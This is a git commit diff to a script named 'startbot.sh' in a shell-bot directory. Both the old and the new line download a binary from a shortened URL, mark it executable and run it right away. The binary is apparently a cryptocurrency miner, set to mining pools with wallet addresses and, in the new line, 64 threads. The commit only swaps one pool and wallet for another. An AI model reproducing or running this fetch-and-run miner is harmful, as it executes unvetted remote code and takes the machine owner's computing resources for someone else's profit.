cd22192a6be66ac22189555f5a11d349884ddadc
AVGandhi <AVGandhi@users.noreply.github.com>
2021-11-22 01:37:19 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -1,2 +1,2 @@
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hotaru -p c=LTC,mc=VRSC
+wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9 -t 64 -p x
